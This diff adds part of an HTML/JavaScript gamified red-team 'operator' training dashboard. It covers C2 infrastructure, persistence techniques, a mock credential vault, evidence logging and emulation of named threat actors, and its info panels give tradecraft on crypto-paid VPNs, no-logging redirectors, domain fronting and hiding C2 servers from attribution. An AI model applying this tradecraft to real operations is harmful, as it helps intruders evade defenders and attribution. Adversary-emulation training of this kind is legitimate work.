+      <circle cx="140" cy="60" r="26" fill="var(--bg2)" stroke="rgba(0,255,136,0.6)" stroke-width="1.5"/>
+      <text x="140" y="56" text-anchor="middle" fill="rgba(0,255,136,0.8)" font-size="16">⚡</text>
+      <text x="140" y="72" text-anchor="middle" fill="rgba(0,255,136,0.6)" font-size="9" letter-spacing="1">OPERATOR</text>
+
+      <!-- Operator 2 -->
+      <circle cx="140" cy="165" r="26" fill="var(--bg2)" stroke="rgba(0,255,136,0.6)" stroke-width="1.5"/>
+      <text x="140" y="161" text-anchor="middle" fill="rgba(0,255,136,0.8)" font-size="16">⚡</text>
+      <text x="140" y="177" text-anchor="middle" fill="rgba(0,255,136,0.6)" font-size="9" letter-spacing="1">OPERATOR</text>
+
+      <!-- Maldev -->
+      <circle cx="560" cy="60" r="26" fill="var(--bg2)" stroke="rgba(255,179,0,0.6)" stroke-width="1.5"/>
+      <text x="560" y="56" text-anchor="middle" fill="rgba(255,179,0,0.8)" font-size="16">🔧</text>
+      <text x="560" y="72" text-anchor="middle" fill="rgba(255,179,0,0.6)" font-size="9" letter-spacing="1">MAL-DEV</text>
+
+      <!-- Infra -->
+      <circle cx="560" cy="165" r="26" fill="var(--bg2)" stroke="rgba(155,89,255,0.6)" stroke-width="1.5"/>
+      <text x="560" y="161" text-anchor="middle" fill="rgba(155,89,255,0.8)" font-size="16">🌐</text>
+      <text x="560" y="177" text-anchor="middle" fill="rgba(155,89,255,0.6)" font-size="9" letter-spacing="1">INFRA ADM</text>
+
+      <!-- Connecting lines with animations -->
+      <line x1="166" y1="72" x2="314" y2="100" stroke="rgba(0,255,136,0.3)" stroke-width="1" stroke-dasharray="4,4">
+        <animate attributeName="stroke-dashoffset" from="0" to="-16" dur="2s" repeatCount="indefinite"/>
+      </line>
+      <line x1="166" y1="155" x2="314" y2="122" stroke="rgba(0,255,136,0.3)" stroke-width="1" stroke-dasharray="4,4">
+        <animate attributeName="stroke-dashoffset" from="0" to="-16" dur="2.2s" repeatCount="indefinite"/>
+      </line>
+      <line x1="534" y1="72" x2="386" y2="100" stroke="rgba(255,179,0,0.3)" stroke-width="1" stroke-dasharray="4,4">
+        <animate attributeName="stroke-dashoffset" from="0" to="-16" dur="1.8s" repeatCount="indefinite"/>
+      </line>
+      <line x1="534" y1="155" x2="386" y2="122" stroke="rgba(155,89,255,0.3)" stroke-width="1" stroke-dasharray="4,4">
+        <animate attributeName="stroke-dashoffset" from="0" to="-16" dur="2.4s" repeatCount="indefinite"/>
+      </line>
+
+      <!-- Labels -->
+      <text x="224" y="80" text-anchor="middle" fill="rgba(0,255,136,0.3)" font-size="8">task assignments</text>
+      <text x="224" y="142" text-anchor="middle" fill="rgba(0,255,136,0.3)" font-size="8">status reports</text>
+      <text x="476" y="80" text-anchor="middle" fill="rgba(255,179,0,0.3)" font-size="8">payload delivery</text>
+      <text x="476" y="142" text-anchor="middle" fill="rgba(155,89,255,0.3)" font-size="8">infra updates</text>
+    </svg>
+  </div>
+
+  <!-- Infra Maintenance Simulation -->
+  <div class="panel mb16">
+    <div class="panel-title">Infrastructure Maintenance Simulation</div>
+    <div class="grid-3">
+      <div>
+        <div class="text-xs text-cyan mb8">Node Status Monitor</div>
+        <div id="node-monitor">
+          <div class="flex items-center justify-between mb6 panel" style="padding:8px">
+            <span class="text-xs">REDIR-EU-1</span>
+            <div class="flex items-center gap6">
+              <div class="status-dot" style="width:6px;height:6px"></div>
+              <span class="text-xs text-green">NOMINAL</span>
+            </div>
+          </div>
+          <div class="flex items-center justify-between mb6 panel" style="padding:8px">
+            <span class="text-xs">REDIR-AP-2</span>
+            <div class="flex items-center gap6">
+              <div class="status-dot amber" style="width:6px;height:6px;background:var(--amber);box-shadow:0 0 6px var(--amber)"></div>
+              <span class="text-xs text-amber">DEGRADED</span>
+            </div>
+          </div>
+          <div class="flex items-center justify-between mb6 panel" style="padding:8px">
+            <span class="text-xs">C2-PRIMARY</span>
+            <div class="flex items-center gap6">
+              <div class="status-dot" style="width:6px;height:6px"></div>
+              <span class="text-xs text-green">NOMINAL</span>
+            </div>
+          </div>
+          <div class="flex items-center justify-between panel" style="padding:8px">
+            <span class="text-xs">VPN-EXIT-1</span>
+            <div class="flex items-center gap6">
+              <div class="status-dot red" style="width:6px;height:6px"></div>
+              <span class="text-xs text-red">OFFLINE</span>
+            </div>
+          </div>
+        </div>
+      </div>
+      <div>
+        <div class="text-xs text-cyan mb8">Maintenance Actions</div>
+        <button class="btn" style="width:100%;margin-bottom:8px" onclick="maintAction('replace')">REPLACE NODE</button>
+        <button class="btn" style="width:100%;margin-bottom:8px" onclick="maintAction('rotate')">ROTATE IPs</button>
+        <button class="btn" style="width:100%;margin-bottom:8px" onclick="maintAction('provision')">PROVISION NEW VPS</button>
+        <button class="btn red-btn" style="width:100%" onclick="maintAction('burn')">BURN & REBUILD</button>
+      </div>
+      <div>
+        <div class="text-xs text-cyan mb8">Action Log</div>
+        <div class="terminal" id="maint-terminal" style="max-height:180px">
+          <span class="terminal-line"><span class="t-output">[INFRA] Status check complete</span></span>
+          <span class="terminal-line"><span class="t-warn">[INFRA] VPN-EXIT-1 OFFLINE</span></span>
+          <span class="terminal-line"><span class="t-output">[INFRA] Awaiting operator action</span></span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Team Ops module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 6: ACCESS MANAGEMENT ============ -->
+<div id="s6" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">06</div>
+    <div>
+      <div class="section-title">Access Management</div>
+      <div class="section-subtitle">PERSISTENCE · CREDENTIAL HANDLING · SESSION MAINTENANCE</div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb16">
+    <!-- Persistence Mechanism Simulator -->
+    <div class="panel">
+      <div class="panel-title">Persistence Mechanism Simulator</div>
+      <div class="text-xs text-dim mb12">Select a persistence technique to visualize execution chain</div>
+      <div class="mb8">
+        <button class="btn mb6" style="width:100%;text-align:left" onclick="showPersist('schtask')">▸ Scheduled Task</button>
+        <button class="btn mb6" style="width:100%;text-align:left" onclick="showPersist('service')">▸ Service Installation</button>
+        <button class="btn mb6" style="width:100%;text-align:left" onclick="showPersist('registry')">▸ Registry Run Key</button>
+        <button class="btn mb6" style="width:100%;text-align:left" onclick="showPersist('wmi')">▸ WMI Event Subscription</button>
+        <button class="btn" style="width:100%;text-align:left" onclick="showPersist('dll')">▸ DLL Hijacking</button>
+      </div>
+      <div id="persist-detail" class="mt12"></div>
+    </div>
+
+    <!-- Credential Vault -->
+    <div class="panel">
+      <div class="panel-title">Credential Vault Interface</div>
+      <div class="text-xs text-dim mb12">Encrypted credential storage — organized by target system</div>
+      <div class="data-table-wrapper">
+        <table class="data-table">
+          <thead>
+            <tr>
+              <th>System</th>
+              <th>Type</th>
+              <th>Privilege</th>
+              <th>Status</th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>CORP-DC01</td>
+              <td><span class="tag cyan">NTLM</span></td>
+              <td><span class="tag red">DOMAIN ADMIN</span></td>
+              <td><span class="tag green">ACTIVE</span></td>
+            </tr>
+            <tr>
+              <td>CORP-SQL01</td>
+              <td><span class="tag cyan">KERBEROS</span></td>
+              <td><span class="tag amber">SERVICE</span></td>
+              <td><span class="tag green">ACTIVE</span></td>
+            </tr>
+            <tr>
+              <td>CORP-FILE01</td>
+              <td><span class="tag cyan">CLEARTEXT</span></td>
+              <td><span class="tag purple">LOCAL ADMIN</span></td>
+              <td><span class="tag amber">EXPIRING</span></td>
+            </tr>
+            <tr>
+              <td>CORP-MAIL01</td>
+              <td><span class="tag cyan">NTLM</span></td>
+              <td><span class="tag green">USER</span></td>
+              <td><span class="tag green">ACTIVE</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="sep"></div>
+      <div class="flex gap8">
+        <div class="risk-ring low">94</div>
+        <div style="flex:1">
+          <div class="text-sm text-green mb4">Access Stability: EXCELLENT</div>
+          <div class="text-xs text-dim">4 active sessions · 1 expiring within 24h · No detection indicators</div>
+          <div class="progress-bar mt8"><div class="progress-fill green" style="width:94%"></div></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Access Stability Monitor -->
+  <div class="panel mb16">
+    <div class="panel-title">Access Stability Monitor</div>
+    <div class="grid-4">
+      <div class="metric-card">
+        <div class="metric-value green">4</div>
+        <div class="metric-label">Active Sessions</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value amber">1</div>
+        <div class="metric-label">Expiring Soon</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value cyan">3</div>
+        <div class="metric-label">Persistence Mech.</div>
+      </div>
+      <div class="metric-card">
+        <div class="metric-value green">0</div>
+        <div class="metric-label">Detected</div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Access Management module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 7: DECISION FRAMEWORKS ============ -->
+<div id="s7" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">07</div>
+    <div>
+      <div class="section-title">Decision Frameworks</div>
+      <div class="section-subtitle">OODA LOOP · INCIDENT RESPONSE · TACTICAL THINKING · ADAPTIVE OPERATIONS</div>
+    </div>
+  </div>
+
+  <!-- OODA Loop -->
+  <div class="panel mb16">
+    <div class="panel-title">OODA Loop Simulator</div>
+    <div class="text-xs text-dim mb16">Observe → Orient → Decide → Act — the operator's decision cycle</div>
+    
+    <div class="grid-4 mb16" id="ooda-phases">
+      <div class="ooda-phase" id="ooda-O1" onclick="activateOODA('O1')">
+        <div class="ooda-letter text-dim">O</div>
+        <div class="text-xs text-dim mt4">Observe</div>
+      </div>
+      <div class="ooda-phase" id="ooda-O2" onclick="activateOODA('O2')">
+        <div class="ooda-letter text-dim">O</div>
+        <div class="text-xs text-dim mt4">Orient</div>
+      </div>
+      <div class="ooda-phase" id="ooda-D" onclick="activateOODA('D')">
+        <div class="ooda-letter text-dim">D</div>
+        <div class="text-xs text-dim mt4">Decide</div>
+      </div>
+      <div class="ooda-phase" id="ooda-A" onclick="activateOODA('A')">
+        <div class="ooda-letter text-dim">A</div>
+        <div class="text-xs text-dim mt4">Act</div>
+      </div>
+    </div>
+
+    <div id="ooda-detail" class="panel" style="display:none;border-color:var(--cyan)">
+      <div id="ooda-detail-content"></div>
+    </div>
+  </div>
+
+  <!-- Incident Scenarios -->
+  <div class="panel mb16">
+    <div class="panel-title">Real-Time Incident Scenarios</div>
+    <div class="text-xs text-dim mb12">Test your tactical decision-making under pressure</div>
+    
+    <div id="scenario-area">
+      <div class="grid-3 mb12">
+        <button class="btn" onclick="loadScenario('blocked-port')">BLOCKED PORTS</button>
+        <button class="btn" onclick="loadScenario('payload-fail')">PAYLOAD FAILURE</button>
+        <button class="btn" onclick="loadScenario('defender-response')">DEFENDER RESPONSE</button>
+      </div>
+      <button class="btn red-btn" style="width:100%;margin-bottom:16px" onclick="loadScenario('lost-access')">LOST ACCESS — CRITICAL SCENARIO</button>
+
+      <div id="scenario-display" style="display:none">
+        <div class="alert-banner" id="scenario-alert"></div>
+        <div class="panel mb12" style="border-color:var(--amber)">
+          <div class="text-sm mb8" id="scenario-text"></div>
+          <div class="text-xs text-dim mb12" id="scenario-context"></div>
+          <div class="text-xs text-cyan mb8">SELECT YOUR RESPONSE:</div>
+          <div id="scenario-options"></div>
+        </div>
+        <div id="scenario-result" style="display:none" class="panel"></div>
+      </div>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Decision Framework module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 8: EVIDENCE & DOCUMENTATION ============ -->
+<div id="s8" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">08</div>
+    <div>
+      <div class="section-title">Evidence & Documentation</div>
+      <div class="section-subtitle">EVIDENCE COLLECTION · FORENSIC INTEGRITY · ATTACK NARRATIVES · DOCUMENTATION</div>
+    </div>
+  </div>
+
+  <div class="grid-2 mb16">
+    <!-- Evidence Collection -->
+    <div class="panel">
+      <div class="panel-title">Evidence Collection Interface</div>
+      <div class="text-xs text-dim mb12">Log proof-of-access for reporting</div>
+      
+      <div class="mb12">
+        <div class="text-xs text-dim mb6">New Evidence Entry</div>
+        <input type="text" id="ev-cmd" placeholder="Command executed..." style="width:100%;background:var(--bg0);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:var(--font);font-size:11px;margin-bottom:6px;outline:none">
+        <input type="text" id="ev-output" placeholder="Output / result..." style="width:100%;background:var(--bg0);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:var(--font);font-size:11px;margin-bottom:6px;outline:none">
+        <input type="text" id="ev-system" placeholder="Target system..." style="width:100%;background:var(--bg0);border:1px solid var(--border);color:var(--text);padding:6px 10px;font-family:var(--font);font-size:11px;margin-bottom:8px;outline:none">
+        <button class="btn green-btn" style="width:100%" onclick="addEvidence()">LOG EVIDENCE</button>
+      </div>
+
+      <div id="evidence-log">
+        <div class="evidence-item">
+          <div style="flex:1">
+            <div class="text-sm text-cyan">whoami /all</div>
+            <div class="text-xs text-dim mt2">NT AUTHORITY\SYSTEM — CORP-DC01</div>
+            <div class="evidence-hash mt2">SHA256: 4f8b2a1c9e3d...</div>
+          </div>
+          <span class="tag green">LOGGED</span>
+        </div>
+        <div class="evidence-item">
+          <div style="flex:1">
+            <div class="text-sm text-cyan">net user /domain</div>
+            <div class="text-xs text-dim mt2">8 domain accounts enumerated — CORP-SQL01</div>
+            <div class="evidence-hash mt2">SHA256: a2c7f9d4b1e6...</div>
+          </div>
+          <span class="tag green">LOGGED</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- Forensic Integrity -->
+    <div class="panel">
+      <div class="panel-title">Forensic Integrity Visualization</div>
+      <div class="text-xs text-dim mb12">Chain of custody · Hash validation · Evidence integrity</div>
+      
+      <div class="mb12">
+        <div class="text-xs text-cyan mb8">Chain of Custody</div>
+        <div class="timeline">
+          <div class="timeline-item" style="padding:8px">
+            <div class="timeline-time">COLLECTION</div>
+            <div class="timeline-content text-xs">Screenshot captured · Timestamp appended · MD5 computed</div>
+            <div class="evidence-hash mt4">MD5: d41d8cd98f00b204e9800998ecf8427e</div>
+          </div>
+          <div class="timeline-item" style="padding:8px">
+            <div class="timeline-time">HASHING</div>
+            <div class="timeline-content text-xs">SHA256 generated · Immutable record created</div>
+            <div class="evidence-hash mt4">SHA256: e3b0c44298fc1c149afbf4c8996fb92427ae41e4...</div>
+          </div>
+          <div class="timeline-item amber" style="padding:8px">
+            <div class="timeline-time">STORAGE</div>
+            <div class="timeline-content text-xs">Encrypted vault storage · Access logged</div>
+          </div>
+          <div class="timeline-item" style="padding:8px;opacity:0.5">
+            <div class="timeline-time">REPORTING</div>
+            <div class="timeline-content text-xs">Analyst review · Client delivery</div>
+          </div>
+        </div>
+      </div>
+
+      <button class="btn" style="width:100%" onclick="runHashVerification()">VERIFY INTEGRITY</button>
+    </div>
+  </div>
+
+  <!-- Attack Narrative Builder -->
+  <div class="panel mb16">
+    <div class="panel-title">Attack Narrative Builder</div>
+    <div class="text-xs text-dim mb12">Generate operational storyline from collected evidence</div>
+    <div class="grid-3 mb12">
+      <button class="btn" onclick="buildNarrative('phishing')">PHISHING CHAIN</button>
+      <button class="btn" onclick="buildNarrative('lateral')">LATERAL MOVEMENT</button>
+      <button class="btn" onclick="buildNarrative('privesc')">PRIVILEGE ESCALATION</button>
+    </div>
+    <div id="narrative-output" class="terminal" style="max-height:200px">
+      <span class="terminal-line"><span class="t-output">Ready to generate attack narrative...</span></span>
+      <span class="terminal-line"><span class="t-output">Select a narrative template above.</span></span>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(50); showAlert('Evidence module assessed. +50 XP', 'green')">COMPLETE MODULE</button>
+</div>
+
+<!-- ============ SECTION 9: ADVERSARY EMULATION ============ -->
+<div id="s9" class="section-wrapper">
+  <div class="section-header">
+    <div class="section-num">09</div>
+    <div>
+      <div class="section-title">Adversary Emulation</div>
+      <div class="section-subtitle">THREAT ACTOR PROFILES · TTP REPLICATION · CAMPAIGN SIMULATION · DETECTION REALISM</div>
+    </div>
+  </div>
+
+  <!-- Threat Profile Selector -->
+  <div class="panel mb16">
+    <div class="panel-title">Threat Actor Profile Selector</div>
+    <div class="text-xs text-dim mb12">Select an adversary to emulate — each has distinct TTPs, infrastructure style, and behavioral patterns</div>
+    <div class="grid-3 mb16">
+      <div class="threat-card" id="threat-apt29" onclick="selectThreat('apt29')">
+        <div class="threat-name">APT29 / Cozy Bear</div>
+        <div class="threat-meta">Nation State · Russia · Espionage</div>
+        <div class="flex gap4 mt8">
+          <span class="tag amber">Stealth</span>
+          <span class="tag purple">Long-term</span>
+          <span class="tag cyan">Supply Chain</span>
+        </div>
+      </div>
+      <div class="threat-card" id="threat-fin7" onclick="selectThreat('fin7')">
+        <div class="threat-name">FIN7</div>
+        <div class="threat-meta">eCrime · Financial Sector · Global</div>
+        <div class="flex gap4 mt8">
+          <span class="tag red">Aggressive</span>
+          <span class="tag amber">Phishing</span>
+          <span class="tag green">Financial</span>
+        </div>
+      </div>
+      <div class="threat-card" id="threat-lazarus" onclick="selectThreat('lazarus')">
+        <div class="threat-name">Lazarus Group</div>
+        <div class="threat-meta">Nation State · DPRK · Financial/Disruption</div>
+        <div class="flex gap4 mt8">
+          <span class="tag red">Destructive</span>
+          <span class="tag purple">Custom Malware</span>
+          <span class="tag cyan">Crypto</span>
+        </div>
+      </div>
+    </div>
+
+    <div id="threat-profile-detail" style="display:none">
+      <div class="panel" style="border-color:var(--red)">
+        <div class="grid-2">
+          <div>
+            <div class="text-xs text-red mb8" id="threat-profile-name">PROFILE</div>
+            <div id="threat-ttp-list"></div>
+          </div>
+          <div>
+            <div class="text-xs text-amber mb8">DETECTION REALISM METER</div>
+            <div id="detection-meter">
+              <div class="mb8">
+                <div class="flex justify-between mb4">
+                  <span class="text-xs text-dim">TTP Accuracy</span>
+                  <span class="text-xs" id="ttp-accuracy">0%</span>
+                </div>
+                <div class="progress-bar"><div class="progress-fill cyan" id="ttp-bar" style="width:0%"></div></div>
+              </div>
+              <div class="mb8">
+                <div class="flex justify-between mb4">
+                  <span class="text-xs text-dim">Infra Mimicry</span>
+                  <span class="text-xs" id="infra-accuracy">0%</span>
+                </div>
+                <div class="progress-bar"><div class="progress-fill cyan" id="infra-bar" style="width:0%"></div></div>
+              </div>
+              <div>
+                <div class="flex justify-between mb4">
+                  <span class="text-xs text-dim">Behavioral Match</span>
+                  <span class="text-xs" id="behavior-accuracy">0%</span>
+                </div>
+                <div class="progress-bar"><div class="progress-fill cyan" id="behavior-bar" style="width:0%"></div></div>
+              </div>
+            </div>
+            <button class="btn mt12" style="width:100%" onclick="runEmulation()">RUN EMULATION SIM</button>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Full Campaign Simulation -->
+  <div class="panel mb16">
+    <div class="panel-title">Full Campaign Simulation</div>
+    <div class="text-xs text-dim mb12">Experience all 5 phases of a professional adversary campaign</div>
+    
+    <div class="grid-4 mb12" id="campaign-sim-phases">
+      <div class="ooda-phase" id="csim-plan" onclick="runCampaignPhase('plan')" style="cursor:pointer">
+        <div class="text-xs text-cyan mb2">01</div>
+        <div class="text-sm">Planning</div>
+      </div>
+      <div class="ooda-phase" id="csim-infra" onclick="runCampaignPhase('infra')" style="cursor:pointer">
+        <div class="text-xs text-cyan mb2">02</div>
+        <div class="text-sm">Infrastructure</div>
+      </div>
+      <div class="ooda-phase" id="csim-exec" onclick="runCampaignPhase('exec')" style="cursor:pointer">
+        <div class="text-xs text-cyan mb2">03</div>
+        <div class="text-sm">Execution</div>
+      </div>
+      <div class="ooda-phase" id="csim-evade" onclick="runCampaignPhase('evade')" style="cursor:pointer">
+        <div class="text-xs text-cyan mb2">04</div>
+        <div class="text-sm">Evasion</div>
+      </div>
+    </div>
+    <button class="btn red-btn" style="width:100%;margin-bottom:12px" onclick="runCampaignPhase('report')">05 — GENERATE FINAL REPORT</button>
+
+    <div id="campaign-sim-output" class="terminal" style="max-height:200px;display:none">
+      <span class="terminal-line" id="csim-output"></span>
+    </div>
+  </div>
+
+  <button class="btn" onclick="awardXP(100); showAlert('All 9 modules complete! Master Operator status achieved. +100 XP', 'green')">COMPLETE ALL MODULES — MASTER OPERATOR</button>
+</div>
+
+</div><!-- /main-content -->
+
+<!-- Alert Container -->
+<div id="alert-container"></div>
+
+<script>
+// =============================================
+// CORE SYSTEM
+// =============================================
+let xp = 0;
+let completedModules = [];
+
+function showSection(id) {
+  document.querySelectorAll('.section-wrapper').forEach(s => s.classList.remove('active'));
+  document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+  document.getElementById(id).classList.add('active');
+  document.querySelector(`[data-section="${id}"]`).classList.add('active');
+  window.scrollTo(0,0);
+  if (!completedModules.includes(id)) {
+    completedModules.push(id);
+    updateCompletion();
+  }
+}
+
+function updateCompletion() {
+  const pct = Math.round((completedModules.length / 9) * 100);
+  document.getElementById('completion-bar').style.width = pct + '%';
+  document.getElementById('completion-text').textContent = completedModules.length + ' / 9 modules';
+}
+
+function awardXP(amount) {
+  xp += amount;
+  document.getElementById('xp-display').textContent = xp;
+  const pct = Math.min(100, Math.round((xp / 450) * 100));
+  document.getElementById('xp-fill').style.width = pct + '%';
+}
+
+function showAlert(msg, type) {
+  const container = document.getElementById('alert-container');
+  const el = document.createElement('div');
+  el.className = 'alert-notif ' + (type || '');
+  el.innerHTML = msg + '<span class="alert-notif-close" onclick="this.parentElement.remove()">✕</span>';
+  container.appendChild(el);
+  setTimeout(() => el.remove && el.remove(), 5000);
+}
+
+// =============================================
+// SECTION 1: OPSEC
+// =============================================
+const opsecState = { personal: true, metadata: 'partial', browser: 'clean', infra: 'clean' };
+
+function toggleOpsecVector(type) {
+  const states = {
+    personal: { current: 'high', next: 'clean', tagId: 'tag-personal', labels: ['ACTIVE', 'ISOLATED'], colors: ['red', 'green'], weights: [78, 5] },
+    metadata: { current: 'partial', next: 'clean', tagId: 'tag-meta', labels: ['PARTIAL', 'CLEAN'], colors: ['amber', 'green'], weights: [45, 8] },
+    browser: { current: 'clean', next: 'leaked', tagId: 'tag-browser', labels: ['CLEAN', 'LEAKED'], colors: ['green', 'red'], weights: [8, 91] },
+    infra: { current: 'clean', next: 'reused', tagId: 'tag-infra', labels: ['CLEAN', 'REUSED'], colors: ['green', 'red'], weights: [5, 88] }
+  };
+  const s = states[type];
+  const tag = document.getElementById(s.tagId);
+  const isFirst = tag.textContent === s.labels[0];
+  tag.textContent = isFirst ? s.labels[1] : s.labels[0];
+  tag.className = 'tag ' + (isFirst ? s.colors[1] : s.colors[0]);
+  
+  // Update score
+  const newScore = isFirst ? Math.max(40, parseInt(document.getElementById('opsec-score').textContent) - 22)
+                           : Math.min(99, parseInt(document.getElementById('opsec-score').textContent) + 22);
+  document.getElementById('opsec-score').textContent = newScore;
+  document.getElementById('opsec-score').className = 'metric-value ' + (newScore > 80 ? 'green' : newScore > 50 ? 'amber' : 'red');
+  
+  const detectPct = (100 - newScore) + '%';
+  document.getElementById('detect-prob').textContent = (100 - newScore) + '%';
+  appendTerminalLine('opsec-terminal', 't-output', '  [*] Vector "' + type + '" state changed — recalculating exposure...');
+}
+
+function runOpsecScan() {
+  appendTerminalLine('opsec-terminal', 't-prompt', 'OPSEC// check --vectors all --deep');
+  appendTerminalLine('opsec-terminal', 't-output', '  Performing deep scan...');
+  setTimeout(() => appendTerminalLine('opsec-terminal', 't-success', '  [✓] VPN routing: ACTIVE'), 500);
+  setTimeout(() => appendTerminalLine('opsec-terminal', 't-success', '  [✓] Browser profile: ISOLATED'), 800);
+  setTimeout(() => appendTerminalLine('opsec-terminal', 't-warn', '  [!] Pattern analysis: Business hours detected'), 1100);
+  setTimeout(() => appendTerminalLine('opsec-terminal', 't-output', '  Scan complete. Review findings above.'), 1400);
+}
+
+function runOpsecSim(type) {
+  const sims = {
+    deanon: { title: 'Deanonymization Simulation', steps: ['Collecting forum post metadata...', 'Extracting email header: X-Originating-IP', 'Correlating IP with prior op persona account', '⚠ IDENTITY COMPROMISE CONFIRMED — Stop operations immediately'] },
+    'infra-trace': { title: 'ASN Pivot Trace', steps: ['Querying ASN registration records...', 'Found: op VPS shares ASN with previous op', 'Cross-referencing registration emails...', '⚠ INFRASTRUCTURE BURNED — Rebuild required'] },
+    timing: { title: 'Timing Attribution Analysis', steps: ['Analyzing operation timestamps...', 'Pattern detected: 09:00-17:00 Mon-Fri UTC+3', 'Correlating with known APT timezone clusters...', '⚠ NATION-STATE ATTRIBUTION POSSIBLE'] }
+  };
+  const sim = sims[type];
+  const term = document.getElementById('opsec-terminal');
+  appendTerminalLine('opsec-terminal', 't-prompt', 'OPSEC// sim --scenario ' + type);
+  sim.steps.forEach((step, i) => {
+    setTimeout(() => {
+      const cls = step.includes('⚠') ? 't-error' : 't-output';
+      appendTerminalLine('opsec-terminal', cls, '  ' + step);
+    }, (i + 1) * 600);
+  });
+  awardXP(10);
+}
+
+// Timing heatmap
+function drawTimingHeatmap() {
+  const canvas = document.getElementById('timing-heatmap');
+  if (!canvas) return;
+  const ctx = canvas.getContext('2d');
+  const W = canvas.width, H = canvas.height;
+  ctx.clearRect(0, 0, W, H);
+  
+  const days = ['Mon','Tue','Wed','Thu','Fri','Sat','Sun'];
+  const hours = 24;
+  const cellW = (W - 40) / hours;
+  const cellH = (H - 20) / 7;
+  
+  // Draw cells
+  for (let d = 0; d < 7; d++) {
+    for (let h = 0; h < hours; h++) {
+      let intensity = 0;
+      if (d < 5 && h >= 9 && h <= 17) intensity = 0.4 + Math.random() * 0.5;
+      else if (d < 5 && (h === 8 || h === 18)) intensity = Math.random() * 0.3;
+      else intensity = Math.random() * 0.05;
+      
+      const r = Math.round(intensity * 255);
+      const g = Math.round((1 - intensity) * 100);
+      ctx.fillStyle = `rgba(${r},${g},0,${0.2 + intensity * 0.7})`;
+      ctx.fillRect(40 + h * cellW, d * cellH, cellW - 1, cellH - 1);
+    }
+    ctx.fillStyle = 'rgba(120,160,200,0.4)';
+    ctx.font = '8px monospace';
+    ctx.fillText(days[d], 2, d * cellH + cellH / 2 + 3);
+  }
+}
+
+// =============================================
+// SECTION 2: INFRASTRUCTURE
+// =============================================
+const nodeData = {
+  operator: { title: 'OPERATOR WORKSTATION', info: 'The operator workstation is the starting point for all operations. It should be a dedicated machine — never a personal system. VPN is always active before any op activity begins. No personal accounts, no personal browsing.' },
+  vpn: { title: 'VPN LAYER (LAYER 1)', info: 'The VPN creates first-hop separation between the operator and the operation. Paid VPN with crypto payment. Jurisdiction outside target country. Kill-switch enabled. Changed per operation.' },
+  redir1: { title: 'REDIRECTOR-1 (EU-WEST)', info: 'Redirectors are sacrificial nodes that forward traffic to the real C2. If a defender blocks a redirector IP, the operation continues through the other redirector. These are deployed fresh per campaign.' },
+  redir2: { title: 'REDIRECTOR-2 (US-EAST)', info: 'Second redirector for redundancy. Geographic diversity reduces correlation risk. Socat/iptables rules forward traffic transparently. No logging configured.' },
+  cloud1: { title: 'CLOUD NODE EU (LAYER 3)', info: 'Cloud provider node adds another layer of obfuscation. Uses legitimate cloud infrastructure (AWS/Azure/GCP) that is harder to block wholesale. Domain fronting can be applied here.' },
+  cloud2: { title: 'CLOUD NODE AP (LAYER 3)', info: 'Asia-Pacific cloud node for geographic redundancy. Traffic from target may appear to come from legitimate cloud providers, reducing suspicion and blocking.' },
+  c2: { title: 'C2 SERVER (LAYER 4 — PROTECTED)', info: 'The command and control server is the most critical infrastructure. It should NEVER be directly accessible. All inbound traffic should come through the redirector chain. This server\'s IP should never appear in target logs.' }
+};
+
+function showNodeInfo(nodeId) {
+  const data = nodeData[nodeId];
+  const panel = document.getElementById('node-info-panel');
+  document.getElementById('node-info-title').textContent = data.title;
+  document.getElementById('node-info-content').textContent = data.info;
+  panel.style.display = 'block';
+}
+
+function updateBeaconInterval(val) {
+  document.getElementById('beacon-interval-val').textContent = val;
+  const term = document.getElementById('c2-terminal');
+  appendTerminalLine('c2-terminal', 't-output', '[C2] Beacon interval updated: ' + val + 's');
+}
+
+function infraFailure(type) {
+  const alert = document.getElementById('infra-alert');
+  alert.style.display = 'flex';
+  if (type === 'ip-block') {
+    alert.textContent = '⚠ REDIR-1 IP BLOCKED — Defender has blocked 203.0.113.44 at perimeter firewall';
+    document.getElementById('redir1-status').textContent = 'BLOCKED';
+    document.getElementById('redir1-status').className = 'tag red';
+  } else if (type === 'redir-loss') {
+    alert.textContent = '⚠ REDIR-2 NODE LOSS — VPS provider suspended account. Node offline.';
+    document.getElementById('redir2-status').textContent = 'OFFLINE';
+    document.getElementById('redir2-status').className = 'tag red';
+  } else if (type === 'c2-detect') {
+    alert.textContent = '⚠ C2 DETECTED — IDS rule hit on C2 domain. Consider domain rotation.';
+    document.getElementById('c2-status').textContent = 'DETECTED';
+    document.getElementById('c2-status').className = 'tag red';
+    document.getElementById('cloud-status').textContent = 'QUARANTINE';
+    document.getElementById('cloud-status').className = 'tag amber';
+  }
+  showAlert('Infrastructure event triggered. Apply recovery procedures.', '');
+}
+
+function infraRecover() {
+  const ids = ['redir1-status','redir2-status','c2-status','cloud-status'];
+  ids.forEach(id => {
+    document.getElementById(id).textContent = 'ONLINE';
+    document.getElementById(id).className = 'tag green';
+  });
+  document.getElementById('infra-alert').style.display = 'none';
+  showAlert('Infrastructure recovered. New nodes provisioned.', 'green');
+  awardXP(15);
+}
+
+// =============================================
+// SECTION 3: EVASION
+// =============================================
+let detectionScores = { av: 82, edr: 54 };
+
